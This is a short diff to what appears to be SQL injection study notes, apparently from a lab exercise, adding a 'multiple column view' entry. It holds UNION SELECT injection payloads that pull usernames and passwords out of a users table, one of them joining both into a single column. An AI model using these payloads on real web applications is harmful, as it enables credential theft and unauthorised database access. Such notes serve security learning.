@@ -32,3 +32,6 @@ as example u retrived USERS_FGOOHN table which saves all users information.
 
 - `' UNION SELECT USERNAME_DZLLNY,PASSWORD_CGOGXE FROM USERS_FGOOHN--` (mysql)
 - `' UNION SELECT USERNAME_DZLLNY,PASSWORD_CGOGXE FROM USERS_FGOOHN--` (oracle)
+
+multiple column view
+- `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
